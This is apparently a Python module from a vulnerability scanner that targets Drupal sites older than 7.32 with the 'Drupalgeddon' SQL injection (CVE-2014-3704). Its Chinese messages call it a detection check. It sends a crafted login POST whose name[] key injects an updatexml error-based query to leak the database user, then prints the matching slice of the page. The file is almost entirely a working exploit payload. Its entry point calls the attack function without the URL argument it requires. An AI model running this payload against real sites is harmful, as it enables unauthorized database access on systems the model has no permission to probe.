# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
import requests
import re

'''
Usage:
    moon.py -u  drupal http://127.0.0.1:8080
    Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）
'''

def attack(URL):
    url = URL+'/?q=node&destination=node'
    print('[+]开始检测-Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）。[+]')

    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
    Content_Type="application/x-www-form-urlencoded"
    headers={"User-Agent":user_agent,"Content-Type":Content_Type}

    data ='pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&name[0]=a'
    try:
        r = requests.post(url,data=data, headers=headers, verify=False)
        soup=BeautifulSoup(r.content,"lxml")
        print('请查看以下内容中是否有 用户名+@+IP 的注入结果:')
        print('--------------------')
        print(str(soup.find_all('li')[2])[100:135])#截取注入结果的那一段字符出来
        print('--------------------')
    except:
        print('someerror!')
    print('[+]检测结束-Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）。[+]')
    print('\n')

if __name__ == "__main__":
    attack()

